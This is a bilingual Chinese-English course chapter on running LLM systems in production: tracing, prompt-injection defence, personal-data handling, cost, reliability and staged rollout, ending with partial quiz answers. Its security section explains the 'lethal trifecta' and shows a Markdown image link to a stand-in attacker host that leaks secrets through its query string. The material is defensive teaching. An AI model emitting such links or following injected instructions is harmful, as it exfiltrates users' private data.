第 8 章Chapter 8

上線：可觀測性、安全與成本Production: observability, security, cost

LLM 系統上線後，問題通常不是「當掉」，而是「安靜地變差」：回答品質下滑、成本慢慢上升、某個 prompt 注入讓它做了不該做的事。這一章談怎麼讓這些問題看得見、擋得住、查得出來。

Once live, LLM systems rarely crash; they degrade quietly. Answer quality slips, cost creeps up, a prompt injection makes them do something they shouldn't. This chapter is about making those problems visible, containable and traceable.

⏱ 30 分鐘min

讀完這章你能夠After this chapter you can

  • 定義每個請求要記錄的追蹤欄位，讓任何一次錯誤回答都能重現原因。
  • 用架構而不是 prompt 來降低提示注入的風險。
  • 找出成本與延遲的主要來源，並按優先順序處理。
  • 規劃逾時、重試、降級、分階段發布與交接。
  • Define the trace fields to record per request so any bad answer can be explained.
  • Reduce prompt-injection risk through architecture rather than prompts.
  • Find the main drivers of cost and latency and address them in order.
  • Plan timeouts, retries, degraded modes, staged rollout and handover.

可觀測性：每個請求都要能重現Observability: every request reproducible

客戶拿著截圖說「它昨天這樣回答」。你需要在幾分鐘內知道：當時用了哪個 prompt 版本、哪個模型、檢索到哪些文件、呼叫了哪些工具、驗證重試了幾次。一般的應用程式 log 不夠，你需要以請求為單位的追蹤（trace）。

A customer shows a screenshot: "it answered like this yesterday". Within minutes you need to know which prompt version and model were used, which documents were retrieved, which tools were called and how many validation retries happened. Ordinary application logs aren't enough; you need per-request traces.

  • 版本化所有東西：prompt、schema、檢索設定、模型 ID。沒有版本，就沒辦法比較改動前後。
  • log 裡也有個資。決定哪些欄位要遮蔽、誰能查、保留多久，和正式資料一樣嚴格。
  • 標準化：OpenTelemetry 已有針對生成式 AI 的語意慣例，可以讓追蹤資料接到既有的監控平台。
  • Version everything: prompts, schemas, retrieval settings, model IDs. Without versions you can't compare before and after.
  • Logs contain personal data too. Decide which fields to mask, who can query them and how long they're kept, as strictly as for production data.
  • Standardise: OpenTelemetry has semantic conventions for generative AI, so traces can flow into existing monitoring platforms.

安全：提示注入Security: prompt injection

只要模型會讀到不可信的內容（使用者輸入、網頁、email、上傳的文件、工具回傳的資料），那些內容就可能包含指令，而模型可能照做。目前沒有任何過濾器或 prompt 寫法能可靠地完全防止。所以要從架構下手：假設注入一定會成功，然後限制它能造成的傷害。

Whenever a model reads untrusted content (user input, web pages, email, uploaded files, tool results), that content may contain instructions the model follows. No filter or prompt wording reliably prevents this today. So work at the architecture level: assume injection will succeed and limit the damage it can do.

致命三要素The lethal trifecta

Simon Willison 提出的框架很實用：當一個 agent 同時具備以下三項能力，攻擊者就可能竊取資料。拿掉任何一項，這條攻擊路徑就斷了。

Simon Willison's framing is practical: when an agent has all three of the following, an attacker can steal data. Remove any one and that attack path closes.

1

能存取機密資料Access to private data

客戶資料庫、內部文件、使用者的信箱。

Customer databases, internal documents, a user's inbox.

2

會讀到不可信內容Exposure to untrusted content

外部信件、網頁、使用者上傳的檔案、公開的 issue。

External email, web pages, user uploads, public issues.

3

能對外傳送資料Ability to communicate externally

呼叫外部 API、寄信、產生會被瀏覽器載入的連結或圖片網址。

Calling external APIs, sending email, emitting links or image URLs a browser will load.

具體措施Concrete measures

  • 最小權限：工具只拿得到這個使用者、這個任務需要的資料（第 5、6 章）。
  • 對外動作需要確認：寄信、付款、修改設定，都由人核准確切內容。
  • 小心輸出被渲染：模型輸出的 Markdown 圖片 ![](https://evil.example/?q=機密) 會讓瀏覽器自動送出資料。限制可載入的網域，或不渲染模型產生的外部圖片與連結。
  • 區隔內容與指令：把不可信內容放在明確標記的區塊中，並告訴模型那只是資料。這能降低機率，但不是安全邊界。
  • 機密不進 prompt：API key、密碼不要出現在模型看得到的任何地方。
  • 測試：把注入攻擊案例加進測試集（第 7 章），每次改動都跑。
  • Least privilege: tools reach only the data this user and this task need (chapters 5 and 6).
  • Confirm outbound actions: sending email, payments, configuration changes all require human approval of the exact content.
  • Beware rendered output: a Markdown image in model output such as ![](https://evil.example/?q=secret) makes the browser send data automatically. Restrict loadable domains, or don't render external images and links produced by the model.
  • Separate content from instructions: wrap untrusted content in clearly marked blocks and tell the model it is data. This lowers the odds but is not a security boundary.
  • Keep secrets out of prompts: API keys and passwords must never appear anywhere the model can see.
  • Test it: add injection cases to your test set (chapter 7) and run them on every change.

個資與資料治理Personal data and governance

  • 最小化：只把完成任務需要的欄位送進模型。身分證字號、卡號通常不需要。
  • 送出前遮蔽：用規則或專門的偵測工具替換成代號，回應後再換回來。
  • 確認供應商條款：資料是否被保留、保留多久、是否用於訓練、在哪個區域處理。這些通常有企業方案或設定可以調整，要在合約階段確認。
  • 保留期限：對話紀錄、trace、測試集都要有明確的保留與刪除規則。
  • Minimise: send only the fields the task needs. National IDs and card numbers usually aren't.
  • Mask before sending: replace sensitive values with tokens via rules or a detection tool, and restore them in the response.
  • Check vendor terms: whether data is retained, for how long, whether it's used for training, and where it's processed. Enterprise plans and settings usually govern these; confirm them at contract time.
  • Retention: conversation logs, traces and test sets all need explicit retention and deletion rules.

成本與延遲Cost and latency

先量測，再優化。trace 裡有每一步的 token 與延遲之後，通常會發現成本集中在少數地方。常見的手段，大致依「不影響品質」到「需要取捨」排列：

Measure, then optimise. Once traces record tokens and latency per step, cost usually turns out to be concentrated in a few places. Common levers, roughly from "free" to "trade-off":

  1. Prompt caching：把不變的內容（system prompt、工具定義、固定文件）放在前面，讓 provider 快取。prompt 開頭只要有一個字元不同（例如放了時間戳記），快取就失效。
  2. 縮短 context：檢索結果取需要的數量、移除重複段落、限制對話歷史長度。
  3. 限制輸出長度，並在 UI 用串流，讓使用者更早看到第一個字。
  4. 離線工作用批次 API：不需要即時回應的大量處理，通常有較低的價格。
  5. 依任務選模型：簡單的分類步驟可能用較小的模型就夠。這是品質取捨，要用評測確認，不要憑感覺降級。
  1. Prompt caching: put stable content (system prompt, tool definitions, fixed documents) first so the provider can cache it. A single changed character early in the prompt (say, a timestamp) invalidates the cache.
  2. Shorter context: retrieve only as many chunks as needed, drop duplicates, cap conversation history.
  3. Cap output length, and stream in the UI so users see the first token sooner.
  4. Batch APIs for offline work: bulk processing that needn't be immediate is usually priced lower.
  5. Choose models per task: a simple classification step may be fine on a smaller model. This trades quality, so confirm it with evals; don't downgrade on a hunch.

可靠性Reliability

  • 逾時：每個外部呼叫都要有逾時，並注意「逾時 × 重試次數」才是最壞情況的總時間。
  • 只重試可重試的錯誤：429、5xx、連線錯誤。400 類錯誤重試也不會成功。官方 SDK 通常內建退避重試，先了解預設值再決定要不要自己包一層。
  • 降級模式：模型不能用時，系統還能提供什麼？例如只回傳檢索到的文件，或轉給人工。
  • 處理 stop_reason：輸出被截斷（max_tokens）或模型拒答（refusal）時，不要把內容當成正常結果使用。
  • Timeouts: every external call has one, and remember timeout × retries is the worst-case total.
  • Retry only retryable errors: 429, 5xx, connection errors. A 400 won't succeed on retry. Official SDKs usually retry with backoff already; know the defaults before wrapping your own.
  • Degraded mode: what can the system still offer when the model is unavailable? Retrieved documents alone, or a handoff to a human.
  • Handle stop_reason: when output is truncated (max_tokens) or declined (refusal), don't treat it as a normal result.

分階段發布Staged rollout

  1. Shadow 新系統在背景處理真實請求，結果不給使用者看，只用來比較。The new system processes real requests in the background; results are compared, not shown.
  2. 只建議Suggest-only 結果給使用者參考，由人決定是否採用。採用率本身就是品質指標。Results are shown as suggestions; a person decides. The adoption rate is itself a quality metric.
  3. 小比例開放Small cohort 開給一部分使用者或一個部門，監控指標正常再擴大。Open to some users or one department; widen while metrics hold.
  4. 全面開放，保留開關Full launch, kill switch kept 一個設定就能關掉 AI 功能並回到原流程。One setting turns the AI feature off and restores the old flow.
模型升級也是發布A model upgrade is a release

固定使用明確的模型 ID。新模型推出時，先在測試集上比較，再走一次分階段發布。新模型在整體上更強，不代表在你的任務上每一類都更好；API 行為與參數也可能改變。

Pin explicit model IDs. When a new model ships, compare it on your test set, then roll it out in stages. A model that is stronger overall isn't necessarily better on every category of your task, and API behaviour and parameters can change too.

All three legs are present. Gating "communicate externally" on human confirmation cuts the automatic exfiltration path. A prompt only lowers the odds; it is not a boundary.
2. 開啟 prompt caching 後，快取命中率一直是 0。最可能的原因是？2. With prompt caching enabled, the cache hit rate stays at 0. Most likely cause?
快取是前綴比對，前面任何一個位元組不同，後面全部失效。把變動的內容移到最後。
Caching matches prefixes: any byte that differs early invalidates everything after it. Move variable content to the end.
3. 供應商推出了新模型，宣稱整體更強。你應該？3. Your vendor ships a new model that is stronger overall. You should:
整體更強不代表你的每個任務類別都更好。模型升級要和程式碼發布一樣經過評測與分階段上線。
Stronger overall doesn't mean better on each of your categories. Treat model upgrades like code releases: evaluate, then roll out in stages.
